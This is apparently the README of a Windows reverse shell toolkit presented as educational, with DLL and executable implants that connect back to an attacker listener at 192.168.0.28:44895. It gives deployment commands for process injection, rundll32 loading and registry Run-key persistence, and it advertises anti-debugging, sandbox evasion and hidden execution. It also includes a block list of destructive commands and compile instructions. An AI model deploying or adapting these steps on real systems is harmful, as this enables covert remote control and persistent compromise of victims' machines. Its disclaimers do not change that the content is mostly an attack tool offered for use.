# 🥷 Ninja Stealth Reverse Shell Collection

A comprehensive cybersecurity research toolkit featuring multiple deployment methods, stealth techniques, and educational reverse shell implementations for controlled VM environments.

## 🎯 Overview

This collection provides various reverse shell implementations designed for cybersecurity research, penetration testing education, and defensive security analysis. Each variant includes stealth features, anti-analysis techniques, and multiple deployment options.

## 📦 Complete Package Contents

### 🥷 Core Implementations
- **Ninja-Stealth-DLL.dll** - Stealth DLL with process injection capabilities
- **Ninja-Stealth-Netcat.exe** - Netcat-compatible standalone executable
- **Ninja-Stealth-Netcat-Static.exe** - Self-contained executable (no dependencies)
- **Reverse-Shell.cpp** - Original source code with ninja-themed comments

### 🛠️ Deployment Tools
- **Ninja-DLL-Loader.exe** - Multi-technique DLL loader and injector
- **Load-Ninja-DLL.ps1** - PowerShell DLL loading script
- **DEPLOYMENT.md** - Comprehensive deployment guide
- **DLL-DEPLOYMENT.md** - DLL-specific deployment instructions
- **QUICK-REFERENCE.md** - Quick reference card

## 🚀 Key Features

### 🔒 Stealth & Evasion
- **Hidden Console Window** - Runs without visible console
- **Anti-Debugging Techniques** - Detects debugger presence
- **Process Injection** - Can inject into other processes
- **Registry Persistence** - Survives system reboots
- **Delayed Execution** - Waits before activation

### 🗡️ Command Execution
- **PowerShell Integration** - Executes commands via PowerShell
- **CMD Fallback** - Falls back to CMD if PowerShell fails
- **Command Validation** - Blocks dangerous commands
- **Plain Text Communication** - Netcat-compatible output

### 🔧 Deployment Methods
1. **DLL Loading** - Load into processes via multiple techniques
2. **Direct Execution** - Run as standalone executable
3. **Process Injection** - Inject into running processes
4. **Registry Persistence** - Automatic startup execution
5. **PowerShell Loading** - Load via PowerShell scripts

## 🎯 Quick Start

### 1. Set Up Listener
```bash
# On attacker machine (192.168.0.28)
nc -lvnp 44895
```

### 2. Choose Deployment Method

#### DLL Method (Most Stealth)
```bash
# Load into current process
Ninja-DLL-Loader.exe 1 Ninja-Stealth-DLL.dll

# Inject into specific process
Ninja-DLL-Loader.exe 3 Ninja-Stealth-DLL.dll 1234

# Direct rundll32
rundll32.exe Ninja-Stealth-DLL.dll,StartNinjaStealth
```

#### Executable Method (Simple)
```bash
# Run standalone executable
Ninja-Stealth-Netcat-Static.exe
```

#### PowerShell Method (Flexible)
```powershell
# Load via PowerShell
.\Load-Ninja-DLL.ps1 -DllPath "Ninja-Stealth-DLL.dll"
```

## 🔧 Configuration

Edit source files to configure:
- **Target IP**: `192.168.0.28` (line ~140 in DLL, ~260 in EXE)
- **Target Port**: `44895` (line ~141 in DLL, ~261 in EXE)
- **Encryption Key**: `0xAA` (line ~23 in DLL, ~19 in EXE)

## 🛡️ Security Features

### Command Filtering
Blocks dangerous commands including:
- `format`, `del`, `delete`, `rd`, `rmdir`
- `shutdown`, `restart`
- PowerShell: `remove-item`, `format-volume`, `stop-computer`

### Anti-Analysis
- Debugger detection
- Sandbox evasion
- Delayed execution
- Process hiding

### Safe Execution
- Command validation before execution
- PowerShell execution policy bypass
- Error handling and fallback mechanisms

## 📋 Usage Examples

### Basic Command Execution
```bash
# Connected to 192.168.0.28:44895
whoami
ipconfig
dir
ls
```

### Advanced Deployment
```bash
# List running processes for injection
Ninja-DLL-Loader.exe list

# Add to startup (persistent)
Ninja-DLL-Loader.exe 4 Ninja-Stealth-DLL.dll

# Manual registry addition
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NinjaStealth" /t REG_SZ /d "rundll32.exe \"C:\path\to\Ninja-Stealth-DLL.dll\",StartNinjaStealth"
```

## 🎨 Ninja-Themed Code

All implementations feature entertaining ninja-themed comments while maintaining technical accuracy:
- "Ancient ninja scroll containing socket combat techniques"
- "Ninja code of honor - blocking forbidden techniques"
- "Ninja vanishing technique - making the console disappear"
- "Shadow warrior's main technique - establishing hidden communication"

## 🧪 Testing Environment

### Recommended Setup
1. **Virtual Machine** - Windows 10/11 target
2. **Network Configuration** - Host-only or NAT network
3. **Netcat Listener** - On attacker machine
4. **Firewall** - Configure appropriately for testing

### Test Sequence
1. Start netcat listener on attacker
2. Deploy chosen variant on target
3. Verify connection establishment
4. Test command execution
5. Check stealth features (hidden console, etc.)

## ⚠️ Important Disclaimers

### Legal & Ethical Use
- **Educational Purpose Only** - Designed for cybersecurity education
- **Controlled Environments** - Use only in authorized VM/test environments
- **Research & Defense** - Intended for defensive security research
- **No Malicious Use** - Not for unauthorized access or attacks

### Security Warnings
- **VM Environment Recommended** - Always test in isolated VMs
- **Network Isolation** - Use appropriate network segmentation
- **Command Validation** - Review blocked commands list
- **Persistence Features** - Understand registry modifications

## 🔍 Technical Details

### Architecture
- **Language**: C++ with Windows API
- **Networking**: Winsock2 TCP sockets
- **Encryption**: Simple XOR obfuscation
- **Process**: Multi-threaded with stealth features

### Dependencies
- **Dynamic**: Requires `ws2_32.dll`, `winhttp.dll`
- **Static**: Self-contained (no external dependencies)
- **Runtime**: Windows 10/11 compatible

### Compilation
```bash
# DLL Version
g++ -shared -o Ninja-Stealth-DLL.dll Ninja-Stealth-DLL.cpp -lws2_32 -lwinhttp -std=c++11

# Static Executable
g++ -mwindows -static -o Ninja-Stealth-Netcat-Static.exe Reverse-Shell.cpp -lws2_32 -lwinhttp -std=c++11

# DLL Loader
g++ -o Ninja-DLL-Loader.exe Ninja-DLL-Loader.cpp -std=c++11
```

## 📚 Educational Value

### Learning Objectives
- Reverse shell implementation techniques
- Windows API usage for networking
- Process injection methodologies
- Stealth and evasion techniques
- DLL development and loading
- PowerShell integration

### Research Applications
- Malware analysis techniques
- Defensive countermeasures
- Detection signature development
- Behavioral analysis patterns
- Incident response procedures

## 🎯 Target Audience

### Cybersecurity Students
- Learning reverse shell concepts
- Understanding Windows internals
- Practicing penetration testing

### Security Researchers
- Analyzing attack techniques
- Developing detection methods
- Building defensive tools

### IT Professionals
- Understanding attack vectors
- Improving security posture
- Training for incident response

## 🔗 Related Resources

### Documentation
- `DEPLOYMENT.md` - Complete deployment guide
- `DLL-DEPLOYMENT.md` - DLL-specific instructions
- `QUICK-REFERENCE.md` - Quick reference card

### Source Files
- `Reverse-Shell.cpp` - Main executable source
- `Ninja-Stealth-DLL.cpp` - DLL source code
- `Ninja-DLL-Loader.cpp` - DLL loader source

## 📞 Support & Community

This toolkit is designed for educational and research purposes in cybersecurity. Users are encouraged to:
- Share findings responsibly
- Contribute to defensive security
- Report bugs and improvements
- Use in authorized environments only

---

**🥷 Remember: With great ninja power comes great responsibility! Use these techniques ethically and legally for cybersecurity education and defense.**

*For research and educational purposes only. Always operate within legal boundaries and authorized environments.*